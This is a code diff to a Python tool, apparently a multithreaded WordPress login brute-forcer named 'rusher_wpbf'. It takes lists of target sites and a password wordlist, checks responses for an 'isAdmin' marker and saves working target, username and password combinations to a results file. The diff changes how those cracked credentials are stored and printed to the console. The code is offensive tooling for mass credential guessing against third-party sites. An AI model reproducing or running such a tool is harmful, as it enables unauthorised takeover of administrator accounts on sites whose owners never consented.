@@ -66,7 +66,7 @@ class rusher_wpbf:
 
             if "<name>isAdmin</name>" in x.text:
 
-                open("result-wp/success.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
+                open("result-wp/success.txt", "a").write("{}|{}|{}\n".format(target, user, passwd))
                 self.result += 1
 
             self.done_process += 1
@@ -131,7 +131,7 @@ class rusher_wpbf:
 
                 with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread) as executor:
 
-                    for target in open(self.args.target, errors="ignore").read().splitlines():
+                    for target in open(self.args.target).read().splitlines():
 
                         executor.submit(self.execution, target, self.args.thread)
 
@@ -151,15 +151,24 @@ class rusher_wpbf:
 
                 print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))
 
-        print("\n[*] [Done]")
+        print("\n")
 
         if self.result > 0:
 
-            print("[+] [Result: result-wp/success.txt]")
+            print("[+] [View Result: result-wp/success.txt]")
+
+            print("\n")
+
+            for x in open("result-wp/success.txt").read().splitlines():
+
+                print("[+] [{}]".format(x))
 
         else:
 
             print("[-] [No Result]")
+
+        print("\n")
+        print("[*] [Done]")
 
 if __name__ == "__main__":
     
